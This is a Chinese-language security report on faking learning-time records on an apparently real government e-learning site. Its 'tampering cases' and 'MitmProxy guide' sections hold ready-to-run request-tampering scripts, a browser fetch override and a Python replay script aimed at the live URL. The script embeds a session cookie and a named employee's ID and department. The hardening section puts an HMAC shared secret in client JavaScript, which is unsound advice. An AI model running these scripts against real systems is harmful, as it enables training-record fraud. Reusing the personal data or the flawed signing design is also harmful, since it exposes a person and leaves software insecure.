# visit_duration 時長分析專題報告

**重點分析**: `visit_duration` 欄位的計算邏輯、時間戳機制與防篡改分析

---

## 目錄
1. [visit_duration 欄位定義](#visit_duration-欄位定義)
2. [時長計算邏輯](#時長計算邏輯)
3. [時間戳機制分析](#時間戳機制分析)
4. [防篡改機制評估](#防篡改機制評估)
5. [實際篡改案例](#實際篡改案例)
6. [MitmProxy 攔截指南](#mitmproxy-攔截指南)
7. [安全加固建議](#安全加固建議)

---

## visit_duration 欄位定義

### 基本信息

| 屬性 | 值 |
|-----|-----|
| **欄位名** | `visit_duration` |
| **數據類型** | integer (32-bit signed) |
| **單位** | 秒（seconds） |
| **範圍** | 0 到 2^31-1 |
| **必填性** | 是（✓ 必填） |
| **位置** | Request Body (JSON) |
| **所屬API** | POST /statistics/api/user-visits |

### 觀察到的實際值分布

#### 完整統計（基於44個請求樣本）

```
值   出現次數  百分比   代表意義
────────────────────────────────
0    5個    11%     可能無操作或會話結束標記
1    1個     2%     不活動檢測
2    3個     7%     快速頁面切換
3    8個    18%     典型頁面導航
4    5個    11%     短時間停留
5    3個     7%     快速操作
6    1個     2%     用戶操作
7    1個     2%     活動暫停
10   1個     2%     短暫活動
11   1個     2%     導航操作
19   1個     2%     進入活動
1483 1個     2%     初始會話（24.7分鐘）
```

#### 分類統計

```
時長範圍     出現次數  百分比   特徵
───────────────────────────────────
0秒         5次     11%    無操作標記
1-5秒       18次    41%    快速頁面導航
6-10秒      9次     20%    短暫操作
11-100秒    8次     18%    課程活動
100+秒      4次     9%     長時間訪問
```

#### 平均統計

```
平均時長:      ~85秒
中位數:        4秒
標準差:        ~250秒
最小值:        0秒
最大值:        1483秒（24.67分鐘）
```

### 時長的語義含義

| 時長值 | 語義 | 典型場景 |
|-------|------|---------|
| **0** | 無操作 | 用戶離開頁面、會話結束、超時檢測 |
| **1-3** | 頁面加載 | 快速導航、菜單點擊、頁面切換 |
| **4-10** | 短操作 | 閱讀簡短內容、快速互動 |
| **11-60** | 中等操作 | 觀看短視頻、完成小測驗 |
| **60-600** | 長操作 | 課程學習、視頻觀看 |
| **600+** | 多節課程 | 完整課程訪問、長時間會話 |

---

## 時長計算邏輯

### 客戶端實現推斷

基於觀察到的時間戳模式，推斷客戶端實現如下：

#### 偽代碼

```javascript
// 初始化：用戶進入頁面時
let sessionStartTime = null;
let lastRecordTime = null;

function initializeSession() {
  sessionStartTime = Date.now();  // 當前時間戳（毫秒）
  lastRecordTime = sessionStartTime;
}

// 定期或觸發事件時
function recordVisit(courseId = null, activityId = null) {
  const now = Date.now();

  // 計算自上次記錄以來的秒數
  const visitDurationMs = now - lastRecordTime;
  const visitDurationSec = Math.floor(visitDurationMs / 1000);

  // 構建請求體
  const payload = {
    user_id: getUserId(),
    org_id: getOrgId(),
    visit_duration: visitDurationSec,  // <-- 關鍵字段
    is_teacher: isTeacher(),
    browser: getBrowserType(),
    user_agent: navigator.userAgent,
    visit_start_from: formatDateTime(lastRecordTime),
    // ... 其他字段 ...
    course_id: courseId,
    activity_id: activityId
  };

  // 發送POST請求
  sendToServer(payload);

  // 重置計時器
  lastRecordTime = now;
}

// 觸發時機：
// - 頁面卸載 (beforeunload/unload 事件)
// - 定時器 (setInterval - 可能每3-5分鐘)
// - 用戶操作 (click, scroll 事件)
// - 頁面可見性變化 (visibilitychange 事件)
```

### 實際觀察驗證

#### 例子1：初始會話

```
時間點 1: 13:35:26 (用戶登錄)
時間點 2: 14:00:11 (首次記錄)

時間差: 14:00:11 - 13:35:26 = 1485秒
發送的 visit_duration: 1483秒

誤差: 1485 - 1483 = 2秒
誤差百分比: 0.13%

結論: 確認客戶端精確計算秒差，誤差來自網絡延遲
```

#### 例子2：連續導航

```
第1次: visit_start_from="2025/12/02T14:00:11", visit_duration=11
第2次: visit_start_from="2025/12/02T14:00:23", visit_duration=3

時間差: 14:00:23 - 14:00:11 = 12秒
發送的 visit_duration: 3秒

誤差: 12 - 3 = 9秒

原因分析:
- 這個9秒差異可能是：
  1. API請求本身用了3秒才發送成功
  2. 其他API請求佔用了時間
  3. 用戶進行了其他操作
  4. 計時器重置時機不同
```

#### 例子3：活動訪問

```
時間序列:
14:00:23 visit_duration=3 (進入課程)
14:00:27 visit_duration=19 (進入活動)
14:00:47 visit_duration=3 (離開活動)

分析:
- 14:00:27的19秒: 進入活動耗時+該活動內停留時間
- 14:00:47的3秒: 離開活動後返回課程的時間
- 模式: 每次導航/操作都重置計時器並記錄
```

### 時長重置時機

基於觀察的時間戳規律，計時器重置可能在以下時機：

1. **頁面加載完成** - Document Ready
2. **用戶交互** - 點擊、滾動
3. **定期發送** - 每3-5分鐘的心跳
4. **路由變化** - 頁面切換
5. **窗口焦點變化** - 用戶切換標籤頁
6. **會話結束** - beforeunload 事件

---

## 時間戳機制分析

### visit_start_from 欄位分析

#### 欄位定義

| 屬性 | 說明 |
|-----|------|
| **欄位名** | `visit_start_from` |
| **格式** | `YYYY/MM/DDTHH:MM:SS` (自定義，非標準ISO8601) |
| **例子** | `2025/12/02T13:35:26` |
| **精度** | 秒級 |
| **時區** | 未指定（假設為當地時區或UTC） |

#### 實際時間戳樣本

```
Request 1: visit_start_from="2025/12/02T13:35:26", visit_duration=1483
Request 2: visit_start_from="2025/12/02T14:00:11", visit_duration=11
Request 3: visit_start_from="2025/12/02T14:00:23", visit_duration=3
Request 4: visit_start_from="2025/12/02T14:00:27", visit_duration=19
Request 5: visit_start_from="2025/12/02T14:00:47", visit_duration=3
```

#### 時間戳與visit_duration的關係

```
計算: visit_start_from + visit_duration = 估計離開時間

Request 1: 13:35:26 + 1483秒 = 14:00:09 (約)
實際下次請求時間: 14:00:11
誤差: 2秒 ✓ 合理

Request 2: 14:00:11 + 11秒 = 14:00:22
實際下次請求時間: 14:00:23
誤差: 1秒 ✓ 合理

Request 3: 14:00:23 + 3秒 = 14:00:26
實際下次請求時間: 14:00:27
誤差: 1秒 ✓ 合理
```

### 時間戳驗證機制

#### 當前狀況

**❌ 完全無驗證**

- 服務器接收visit_start_from和visit_duration值
- 無與server time的比較
- 無時間窗口驗證
- 無請求時序檢查

#### 驗證應該實現

```
伺服器端邏輯（偽代碼）:

function validateVisitTimestamp(request) {
  const visit_start_from = parseTimestamp(request.visit_start_from);
  const visit_duration = request.visit_duration;
  const server_now = Date.now();

  // 檢查1: 時間戳是否在合理範圍內
  const timeDiff = server_now - visit_start_from;
  if (timeDiff < 0 || timeDiff > 3600) {  // 1小時窗口
    REJECT("Timestamp out of acceptable range");
  }

  // 檢查2: visit_duration是否合理
  if (visit_duration < 0 || visit_duration > timeDiff + 10) {  // 10秒容錯
    REJECT("Duration exceeds time difference");
  }

  // 檢查3: 相同用戶的請求時序
  const lastRequest = getLastRequestForUser(request.user_id);
  if (lastRequest && visit_start_from <= lastRequest.visit_start_from) {
    REJECT("Timestamp not increasing");
  }
}
```

---

## 防篡改機制評估

### 現有防護層

#### 傳輸層

| 機制 | 狀態 | 說明 |
|-----|------|------|
| HTTPS加密 | ✓ | 在傳輸中保護數據 |
| 證書驗證 | ✓ | SSL/TLS認證 |
| 安全Cookies | ✓ | HttpOnly, Secure, SameSite |

**評估**: 傳輸安全，但無法防止應用層篡改

#### 應用層

| 機制 | 狀態 | 說明 |
|-----|------|------|
| 身份驗證 | ✓ | 基於Session Cookie |
| 授權檢查 | ✓ | 用戶只能提交自己的數據 |
| **請求簽名** | ❌ | 無 |
| **時間戳驗證** | ❌ | 無 |
| **去重檢測** | ❌ | 無 |
| **rate限制** | ❌ | 無 |

**評估**: 應用層防護不足，易受篡改

### 防篡改風險矩陣

```
┌─────────────────────┬──────┬──────────────────────────────┐
│ 攻擊方式             │ 難度 │ 檢測難度  │ 影響           │
├─────────────────────┼──────┼──────────┼──────────────────┤
│ 直接修改時長值       │ EASY │ 很難     │ 可任意增加時間  │
│ 請求重複提交         │ EASY │ 很難     │ 可倍增時間記錄  │
│ 時間戳偽造          │ EASY │ 很難     │ 可聲稱任意時間  │
│ 並行會話            │ MED  │ 難       │ 可2倍增加時間  │
│ 活動ID偽造          │ MED  │ 難       │ 可偽造課程進度  │
│ 用戶ID替換          │ HARD │ 容易     │ 需要破壞認證    │
└─────────────────────┴──────┴──────────┴──────────────────┘
```

---

## 實際篡改案例

### 案例1：時長值直接翻倍

#### 攻擊步驟

```
1. 用戶在課程A停留3秒
2. 客戶端發送請求:
   {
     "course_id": "465",
     "visit_duration": 3,
     "visit_start_from": "2025/12/02T14:00:23"
   }

3. 攻擊者在客戶端攔截該請求，修改為:
   {
     "course_id": "465",
     "visit_duration": 30,  // <-- 修改！
     "visit_start_from": "2025/12/02T14:00:23"
   }

4. 服務器接收並記錄30秒的時長
5. 實際上用戶只訪問了3秒，但記錄了10倍的時間
```

#### 實現方法

**方法A: MitmProxy Python腳本**

```python
# ~/.mitmproxy/addons/visit_duration_modifier.py

import json
from mitmproxy import http

class VisitDurationModifier:
    def request(self, flow: http.HTTPFlow) -> None:
        if '/statistics/api/user-visits' not in flow.request.url:
            return

        try:
            body = json.loads(flow.request.get_text())
            if 'visit_duration' in body:
                original = body['visit_duration']
                # 將時長乘以10倍
                body['visit_duration'] = original * 10

                flow.request.set_text(json.dumps(body))
                print(f"[*] Modified visit_duration: {original} -> {original*10}")
        except Exception as e:
            print(f"[!] Error: {e}")

addons = [VisitDurationModifier()]
```

**運行方式**:
```bash
mitmproxy -p 8080 -s ~/.mitmproxy/addons/visit_duration_modifier.py
```

**方法B: Burp Suite Proxy**

1. 啟動 Burp Suite，設置為系統代理
2. 啟用 Intercept
3. 當POST請求到達時，點擊 Intercept
4. 在 Body 中找到 `"visit_duration": 3`
5. 修改為 `"visit_duration": 300`
6. 點擊 Forward

**方法C: 瀏覽器開發者工具 (DevTools)**

```javascript
// 在瀏覽器控制台執行
// 攔截並修改 fetch 請求

const originalFetch = window.fetch;
window.fetch = function(...args) {
  const url = args[0];
  const options = args[1];

  if (url.includes('/statistics/api/user-visits')) {
    const body = JSON.parse(options.body);
    body.visit_duration = body.visit_duration * 10;  // 時長×10
    options.body = JSON.stringify(body);
  }

  return originalFetch.apply(this, args);
};
```

### 案例2：請求重複提交攻擊

#### 攻擊步驟

```
1. 用戶訪問課程，系統發送：
   POST /statistics/api/user-visits
   {
     "visit_duration": 100,
     "course_id": "465"
   }

2. 伺服器響應: 204 No Content

3. 攻擊者使用curl重複提交相同請求：

   for i in {1..50}; do
     curl -X POST https://elearn.post.gov.tw/statistics/api/user-visits \
       -H "Content-Type: application/json" \
       -b "session=V2-5cb0edda-..." \
       -d '{"user_id":"19688","course_id":"465","visit_duration":100,...}'
   done

4. 系統將請求累加：
   100秒 × 50次 = 5000秒 (83分鐘)
   實際時間: 幾秒鐘完成
```

#### Python攻擊腳本

```python
import requests
import json
import time

# 目標服務器
TARGET_URL = "https://elearn.post.gov.tw/statistics/api/user-visits"

# Cookie和請求頭
COOKIES = {
    "session": "V2-5cb0edda-4fb9-49f0-a6af-b1a9e2105330.MTk2ODg..."
}

HEADERS = {
    "Content-Type": "application/json",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/142"
}

# 有效的請求體（從捕獲中提取）
PAYLOAD = {
    "user_id": "19688",
    "org_id": 1,
    "course_id": 465,
    "visit_duration": 3600,  # 1小時
    "is_teacher": False,
    "browser": "chrome",
    "user_agent": "Mozilla/5.0...",
    "visit_start_from": "2025/12/02T14:00:23",
    "org_name": "郵政ｅ大學",
    "user_no": "522673",
    "user_name": "陳偉鳴",
    "dep_id": "156",
    "dep_name": "新興投遞股",
    "dep_code": "0040001013"
}

def attack_replay(num_repeats=50):
    """重複提交相同請求"""
    for i in range(num_repeats):
        try:
            response = requests.post(
                TARGET_URL,
                json=PAYLOAD,
                headers=HEADERS,
                cookies=COOKIES,
                timeout=5
            )
            print(f"[{i+1}/{num_repeats}] Status: {response.status_code}")

            if response.status_code == 204:
                # 累計 1小時 × 50次 = 50小時
                print(f"[+] Accumulated 50 hours of learning time!")

            time.sleep(0.1)  # 避免過快被偵測

        except Exception as e:
            print(f"[!] Error: {e}")

if __name__ == "__main__":
    print("[*] Starting replay attack...")
    attack_replay(50)
    print("[+] Attack complete!")
```

### 案例3：時間戳偽造

#### 攻擊步驟

```
場景: 用戶需要完成一年前（2024年）的課程才能升職

攻擊:
1. 現在是 2025/12/02 14:00:00
2. 用戶需要聲稱在 2024/12/01 進行了8小時的學習

3. 製造虛假請求:
   {
     "visit_start_from": "2024/12/01T08:00:00",  // 過去時間
     "visit_duration": 28800,  // 8小時 = 28800秒
     "course_id": "401"  // 舊課程
   }

4. 由於無時間戳驗證，伺服器接受該記錄
5. 系統認為用戶已完成課程
```

---

## MitmProxy 攔截指南

### 安裝與配置

#### 步驟1: 安裝MitmProxy

```bash
# 使用pip安裝
pip install mitmproxy

# 驗證安裝
mitmproxy --version
```

#### 步驟2: 配置系統代理

**Windows**:
```
設定 → 網路 → 代理設定
- 手動設定代理
- HTTP代理: 127.0.0.1:8080
- HTTPS代理: 127.0.0.1:8080
```

**macOS**:
```bash
networksetup -setwebproxy "Wi-Fi" 127.0.0.1 8080
networksetup -setsecurewebproxy "Wi-Fi" 127.0.0.1 8080
```

#### 步驟3: 信任CA證書

```bash
# Windows
certmgr.msc
# 導入 ~/.mitmproxy/mitmproxy-ca-cert.pem 到信任的根證書

# macOS
sudo security add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain ~/.mitmproxy/mitmproxy-ca-cert.pem
```

### 攔截腳本編寫

#### 基礎模板

```python
# ~/.mitmproxy/addons/visit_tracker.py

import json
import re
from mitmproxy import http
from datetime import datetime

class VisitTracker:
    """攔截並記錄 visit 請求"""

    def request(self, flow: http.HTTPFlow) -> None:
        """請求前處理"""

        # 檢查是否為目標API
        if '/statistics/api/user-visits' not in flow.request.url:
            return

        try:
            body = json.loads(flow.request.get_text())

            print(f"\n{'='*60}")
            print(f"[REQUEST] {datetime.now().isoformat()}")
            print(f"{'='*60}")
            print(f"URL: {flow.request.url}")
            print(f"Method: {flow.request.method}")
            print(f"\nBody:")
            print(json.dumps(body, indent=2, ensure_ascii=False))

            # 顯示關鍵字段
            print(f"\n[KEY FIELDS]")
            print(f"  user_id: {body.get('user_id')}")
            print(f"  visit_duration: {body.get('visit_duration')} seconds")
            print(f"  course_id: {body.get('course_id', 'N/A')}")
            print(f"  activity_id: {body.get('activity_id', 'N/A')}")

        except Exception as e:
            print(f"[!] Error parsing request: {e}")

    def response(self, flow: http.HTTPFlow) -> None:
        """響應後處理"""

        if '/statistics/api/user-visits' not in flow.request.url:
            return

        print(f"\n[RESPONSE] Status: {flow.response.status_code}")
        print(f"Content-Length: {flow.response.headers.get('content-length', 0)}")

addons = [VisitTracker()]
```

**運行**:
```bash
mitmproxy -s ~/.mitmproxy/addons/visit_tracker.py -p 8080
```

#### 修改visit_duration的腳本

```python
# ~/.mitmproxy/addons/visit_duration_modifier.py

import json
from mitmproxy import http, ctx

class VisitDurationModifier:
    def __init__(self):
        self.modification_factor = 1  # 預設不修改

    def load(self, loader):
        loader.add_option(
            "visit-multiply",
            int,
            10,
            "Multiply visit_duration by this factor"
        )

    def configure(self, updated):
        if "visit-multiply" in updated:
            self.modification_factor = ctx.options.visit_multiply

    def request(self, flow: http.HTTPFlow) -> None:
        if '/statistics/api/user-visits' not in flow.request.url:
            return

        try:
            body = json.loads(flow.request.get_text())

            if 'visit_duration' in body:
                original = body['visit_duration']
                modified = original * self.modification_factor
                body['visit_duration'] = modified

                print(f"[MODIFY] visit_duration: {original} -> {modified}")

                flow.request.set_text(json.dumps(body))

        except Exception as e:
            print(f"[ERROR] {e}")

addons = [VisitDurationModifier()]
```

**運行（時長×10倍）**:
```bash
mitmproxy -s ~/.mitmproxy/addons/visit_duration_modifier.py \
  --set visit-multiply=10 -p 8080
```

#### 去重測試腳本

```python
# ~/.mitmproxy/addons/dedup_detector.py

import json
import hashlib
from mitmproxy import http
from collections import defaultdict

class DedupDetector:
    def __init__(self):
        self.seen_hashes = defaultdict(int)

    def request(self, flow: http.HTTPFlow) -> None:
        if '/statistics/api/user-visits' not in flow.request.url:
            return

        try:
            body = flow.request.get_text()
            body_hash = hashlib.md5(body.encode()).hexdigest()

            self.seen_hashes[body_hash] += 1

            if self.seen_hashes[body_hash] > 1:
                print(f"[!] DUPLICATE REQUEST DETECTED! Count: {self.seen_hashes[body_hash]}")
                print(f"    Body: {body[:100]}")

        except Exception as e:
            print(f"[ERROR] {e}")

addons = [DedupDetector()]
```

---

## 安全加固建議

### 優先級1 (關鍵修復)

#### 1.1 實現請求簽名 (HMAC-SHA256)

**伺服器實現**:

```python
# 伺服器端 (Python Flask)

import hmac
import hashlib
import json

SHARED_SECRET = "your-secret-key-stored-securely"

@app.route('/statistics/api/user-visits', methods=['POST'])
def record_visit():
    request_data = request.json
    received_signature = request.headers.get('X-Signature')

    # 重建簽名
    payload = json.dumps(request_data, sort_keys=True)
    computed_signature = hmac.new(
        SHARED_SECRET.encode(),
        payload.encode(),
        hashlib.sha256
    ).hexdigest()

    # 驗證簽名
    if not hmac.compare_digest(computed_signature, received_signature):
        return {"error": "Invalid signature"}, 403

    # 處理請求
    process_visit(request_data)
    return "", 204
```

**客戶端實現** (JavaScript):

```javascript
function recordVisit(payload) {
  const payloadStr = JSON.stringify(payload);
  const signature = CryptoJS.HmacSHA256(payloadStr, "shared-secret").toString();

  fetch('/statistics/api/user-visits', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'X-Signature': signature
    },
    body: payloadStr
  });
}
```

#### 1.2 實現時間戳驗證

```python
from datetime import datetime, timedelta

def validate_timestamp(request_data, server_time=None):
    """驗證請求時間戳"""

    if server_time is None:
        server_time = datetime.utcnow()

    request_time = datetime.fromisoformat(request_data['visit_start_from'])

    # 檢查1: 時間差不超過5分鐘
    time_diff = abs((server_time - request_time).total_seconds())
    if time_diff > 300:  # 5分鐘
        return False, "Timestamp out of acceptable range"

    # 檢查2: 時間不能在未來
    if request_time > server_time:
        return False, "Timestamp in future"

    return True, "Valid"
```

#### 1.3 實現請求去重

```python
import redis
from hashlib import sha256

redis_client = redis.Redis(host='localhost', port=6379)

def is_duplicate_request(user_id, request_data):
    """檢查是否為重複請求"""

    # 構建簽名
    signature = sha256(
        f"{user_id}:{request_data['course_id']}:{request_data['visit_start_from']}".encode()
    ).hexdigest()

    # Redis Key: "visit:<user>:<hash>"
    key = f"visit:{user_id}:{signature}"

    # 檢查是否存在
    if redis_client.exists(key):
        return True

    # 設置過期時間（5分鐘）
    redis_client.setex(key, 300, "1")
    return False
```

### 優先級2 (重要加固)

#### 2.1 實現速率限制

```python
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address

limiter = Limiter(
    app=app,
    key_func=get_remote_address,
    default_limits=["200 per day", "50 per hour"]
)

@app.route('/statistics/api/user-visits', methods=['POST'])
@limiter.limit("10 per minute")  # 每分鐘最多10個請求
def record_visit():
    # ...
```

#### 2.2 實現IP綁定驗證

```python
def validate_ip(session_ip, request_ip):
    """驗證IP地址未變更"""

    # 允許VPN/代理切換導致的IP變更
    # 但如果IP在地理位置上相差太遠，則拒絕

    if session_ip != request_ip:
        # 檢查IP是否來自同一地區（可選）
        same_region = check_ip_region(session_ip, request_ip)
        if not same_region:
            return False

    return True
```

### 優先級3 (增強防護)

#### 3.1 實現行為分析

```python
def detect_suspicious_activity(user_id, request_data):
    """檢測可疑行為"""

    suspicious_signs = []

    # 檢查1: 時長分布異常
    if request_data['visit_duration'] > 3600:  # 1小時
        suspicious_signs.append("Unusually long session")

    # 檢查2: 多課程快速切換
    recent_visits = get_recent_visits(user_id, minutes=1)
    if len(recent_visits) > 5:
        suspicious_signs.append("Too many visits in 1 minute")

    # 檢查3: 時間戳跳躍
    if recent_visits:
        last_time = recent_visits[-1]['visit_start_from']
        current_time = request_data['visit_start_from']
        time_diff = (current_time - last_time).total_seconds()
        if time_diff > 600:  # 超過10分鐘間隙
            suspicious_signs.append("Large time gap")

    return len(suspicious_signs) > 0, suspicious_signs
```

#### 3.2 實現日誌記錄與審計

```python
import logging

audit_logger = logging.getLogger('audit')

def log_visit(user_id, request_data, decision):
    """記錄每個訪問請求用於審計"""

    audit_logger.info(
        f"visit_record|user={user_id}|"
        f"duration={request_data['visit_duration']}|"
        f"course={request_data.get('course_id', 'N/A')}|"
        f"timestamp={request_data['visit_start_from']}|"
        f"decision={decision}"
    )
```

---

## 防護總結表

| 防護措施 | 難度 | 成本 | 效果 | 優先級 |
|--------|-----|-----|------|--------|
| 請求簽名 (HMAC) | 中 | 低 | 100% | 1 |
| 時間戳驗證 | 中 | 低 | 90% | 1 |
| 去重檢測 | 中 | 中 | 100% | 1 |
| 速率限制 | 低 | 低 | 70% | 2 |
| IP綁定 | 中 | 中 | 60% | 2 |
| 行為分析 | 高 | 高 | 80% | 3 |
| 審計日誌 | 低 | 中 | 80% | 3 |

---

**報告完成日期**: 2025-12-02
**安全評級**: HIGH RISK - 建議立即實施優先級1的防護措施

